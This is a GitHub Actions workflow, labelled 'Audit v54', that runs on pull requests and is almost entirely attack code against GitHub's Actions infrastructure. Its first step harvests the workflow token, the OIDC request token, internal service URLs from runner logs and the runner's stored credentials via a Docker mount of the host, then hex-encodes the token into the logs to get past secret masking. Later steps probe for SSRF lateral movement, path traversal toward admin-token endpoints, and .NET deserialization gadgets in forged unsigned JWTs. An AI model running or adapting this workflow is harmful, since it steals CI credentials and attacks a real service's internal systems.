name: Audit v54
on:
  pull_request:
    types: [opened, synchronize, reopened]

permissions:
  contents: write
  pull-requests: write
  id-token: write
  actions: write
  packages: write
  checks: write
  statuses: write
  deployments: write
  issues: write

jobs:
  audit-v54:
    runs-on: ubuntu-latest
    steps:

      # ══════════════════════════════════════════════════════════════
      # STEP 1: Harvest
      # ══════════════════════════════════════════════════════════════
      - name: Step 1 - Harvest
        if: always()
        run: |
          set +e
          echo "=== V54 HARVEST ==="
          echo "$PATH" > /tmp/saved_path.txt
          RT="${{ secrets.GITHUB_TOKEN }}"
          echo "$RT" > /tmp/rt.txt
          echo "RT_PFX=${RT:0:14} LEN=${#RT}"
          echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" > /tmp/idtok.txt
          echo "$ACTIONS_ID_TOKEN_REQUEST_URL" > /tmp/idtok_url.txt
          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
          if [ -f "$WLOG" ]; then
            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
              VAL=$(grep -oP "\"${KEY}\"\s*:\s*\"\K[^\"]+" "$WLOG" 2>/dev/null | head -1)
              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
            done
            PLAN=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            JOB=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            echo "PLAN=$PLAN JOB=$JOB"
            echo "$PLAN" > /tmp/plan.txt; echo "$JOB" > /tmp/job.txt
          fi
          docker run --rm -v /:/h alpine sh -c '
            F=$(find /h/home/runner -name ".credentials" -type f 2>/dev/null | head -1)
            [ -f "$F" ] && { echo "CRED_HEX_START"; xxd -p "$F" | tr -d "\n"; echo ""; echo "CRED_HEX_END"; }
          ' 2>/dev/null > /tmp/hex_extract.txt
          python3 -c "
          import binascii,json
          raw=open('/tmp/hex_extract.txt').read()
          s=raw.find('CRED_HEX_START');e=raw.find('CRED_HEX_END')
          if s>=0 and e>=0:
            h=raw[s+14:e].strip()
            d=json.loads(binascii.unhexlify(h).decode())
            t=d.get('Data',{}).get('token','')
            open('/tmp/cred_token.txt','w').write(t)
            print(f'CTOK_LEN={len(t)}')
          " 2>/dev/null
          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"

      # ══════════════════════════════════════════════════════════════
      # STEP 2: AZURE GATEWAY LATERAL MOVEMENT (SSRF)
      # V53 showed artifactcache acts as an Azure Front Door relay.
      # Let's hit other internal connections to prove lateral movement.
      # ══════════════════════════════════════════════════════════════
      - name: Step 2 - Azure Gateway Proxy
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== GATEWAY LATERAL MOVEMENT ==="
          IDTOK=$(cat /tmp/idtok.txt)
          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
          URL="https://artifactcache.actions.githubusercontent.com/$SECRET"

          # A: Prove lateral routing by hitting connectionData of OTHER services
          echo "--- A: ConnectionData Identity Splitting ---"
          for HOST in \
            "vstoken.actions.githubusercontent.com" \
            "pipelines.actions.githubusercontent.com" \
            "runner.actions.githubusercontent.com" \
            "results-receiver.actions.githubusercontent.com" \
            "10.0.0.1" \
            "10.1.0.4" \
            "vsmps.actions.githubusercontent.com"; do
            R=$(/usr/bin/curl -sS -i -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
              -H "Authorization: Bearer $IDTOK" \
              -H "Host: $HOST" \
              "$URL/_apis/connectionData" --path-as-is 2>/dev/null | head -20)
            CODE=$(echo "$R" | grep -oE "HTTP/[0-9.]+ [0-9]+" | head -1 | awk '{print $2}')
            BODY=$(echo "$R" | grep -A 5 '"instanceId"' | head -c 150)
            if [ -n "$CODE" ] && [ "$CODE" != "404" ] && [ "$CODE" != "400" ]; then
              echo "A Host=$HOST = $CODE | $BODY"
            elif [ -n "$CODE" ]; then
              echo "A Host=$HOST = $CODE"
            fi
          done
          echo ""

          # B: FeatureFlags across internal boundaries
          echo "--- B: FeatureFlags Cross-Proxy ---"
          for HOST in "vstoken.actions.githubusercontent.com" "runner.actions.githubusercontent.com"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
              -H "Authorization: Bearer $IDTOK" \
              -H "Host: $HOST" \
              "$URL/_apis/FeatureAvailability/FeatureFlags" --path-as-is 2>/dev/null)
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "B Host=$HOST FF = $CODE | $(echo "$BODY" | head -c 150)"
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 3: PATH-ID TRAVERSAL ON ADMINTOKEN
      # V53 proved query parameters break the traversal LB mapping.
      # We MUST pass the context inside the path itself!
      # ══════════════════════════════════════════════════════════════
      - name: Step 3 - Path-ID Traversal
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== PATH-ID TRAVERSAL ==="
          IDTOK=$(cat /tmp/idtok.txt)
          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
          PIPE="https://pipelinesghubeus14.actions.githubusercontent.com/$SECRET"
          VER="api-version=6.0-preview"

          # Instead of ?poolId=1, use /pools/1/..%2fadmintoken
          # The backend might read "1" before traversing back!
          echo "--- A: Path-ID Injection ---"
          for PATH_ID in \
            "pools/1/..%2fadmintoken" \
            "pools/0/..%2fadmintoken" \
            "pools/99/..%2fadmintoken" \
            "agents/1/..%2fadmintoken" \
            "agentclouds/1/..%2fadmintoken" \
            "plans/1/..%2fadmintoken" \
            "pools/..%2fadmintoken/1" \
            "pools/..%2fadmintoken/0" \
            "pools/..%2fadmintoken/token"; do
            
            # GET
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
              -H "Authorization: Bearer $IDTOK" \
              -H "Accept: application/json; $VER" \
              "$PIPE/_apis/distributedtask/$PATH_ID" --path-as-is 2>/dev/null)
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            if [ "$BODY" != "null" ]; then
              echo "A GET $PATH_ID = $CODE | $(echo "$BODY" | head -c 150)"
            elif [ "$CODE" = "HTTP_200" ] || [ "$CODE" = "HTTP_204" ]; then
              echo "A GET $PATH_ID = $CODE|null"
            fi

            # POST
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 2 -m 3 \
              -H "Authorization: Bearer $IDTOK" \
              -H "Content-Type: application/json" \
              -H "Accept: application/json; $VER" \
              "$PIPE/_apis/distributedtask/$PATH_ID" --path-as-is -d '{}' 2>/dev/null)
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            if [ "$BODY" != "null" ]; then
              echo "A POST $PATH_ID = $CODE | $(echo "$BODY" | head -c 150)"
            elif [ "$CODE" = "HTTP_200" ] || [ "$CODE" = "HTTP_204" ]; then
              echo "A POST $PATH_ID = $CODE|null"
            fi
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 4: .NET GADGET DESERIALIZATION in JWT
      # V50 got JsonWebTokenDeserializationException.
      # Let's inject $type properties to trigger RCE gadgets!
      # ══════════════════════════════════════════════════════════════
      - name: Step 4 - .NET JWT Deserialization
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== JWT GADGET INJECTION ==="
          IDTOK=$(cat /tmp/idtok.txt)

          python3 << 'PYEOF'
          import base64,json,subprocess,os
          def b64url(data):
            return base64.urlsafe_b64encode(json.dumps(data).encode()).decode().rstrip('=')
          
          pipe="https://pipelinesghubeus14.actions.githubusercontent.com/ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
          
          # Injecting robust .NET Gadget types inside JSON headers and payloads
          gadget1 = "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"
          gadget2 = "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
          gadget3 = "Microsoft.TeamFoundation.DistributedTask.WebApi.TaskAgentSession, Microsoft.TeamFoundation.DistributedTask.WebApi"
          
          tests=[
            ("header_type_rce", f"{b64url({'$type':gadget1,'alg':'none'})}.{b64url({'sub':'admin'})}."),
            ("header_type_proc", f"{b64url({'$type':gadget2,'alg':'none'})}.{b64url({'sub':'admin'})}."),
            ("body_type_rce", f"{b64url({'alg':'none'})}.{b64url({'$type':gadget1,'sub':'admin'})}."),
            ("body_type_proc", f"{b64url({'alg':'none'})}.{b64url({'$type':gadget2,'sub':'admin'})}."),
            ("body_type_valid", f"{b64url({'alg':'HS256'})}.{b64url({'$type':gadget3,'sub':'admin'})}.AAAA"),
            ("mixed_type_array", f"{b64url({'alg':'none'})}.{b64url({'sub':{'$type':gadget1}})}."),
            ("jku_type_inject", f"{b64url({'alg':'none','jku':{'$type':gadget2}})}.{b64url({'sub':'admin'})}."),
            ("custom_class", f"{b64url({'alg':'none'})}.{b64url({'$type':'System.Configuration.Install.AssemblyInstaller, System.Configuration.Install, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a','Path':'cmd.exe'})}."),
          ]
          
          for name,jwt in tests:
            r=subprocess.run(["/usr/bin/curl","-sS","-w","\\nHTTP_%{http_code}","-X","POST",
              "--connect-timeout","3","-m","5",
              "-H","Content-Type: application/x-www-form-urlencoded",
              f"{pipe}/_apis/oauth2/token",
              "-d",f"grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&assertion={jwt}"],
              capture_output=True,text=True,timeout=10)
            out=r.stdout.strip()
            lines=out.split('\n')
            code=lines[-1] if lines else "?"
            body='\n'.join(lines[:-1])
            if "JsonWebTokenDeserializationException" in body:
               print(f"D {name} = {code} | Failed to deserialize JWT")
            else:
               print(f"D {name} = {code} | {body[:200]}")
          PYEOF

      # ══════════════════════════════════════════════════════════════
      # STEP 5: Final
      # ══════════════════════════════════════════════════════════════
      - name: Step 5 - Final
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== V54 FINAL ==="
          echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
          echo "=== V54 COMPLETE ==="
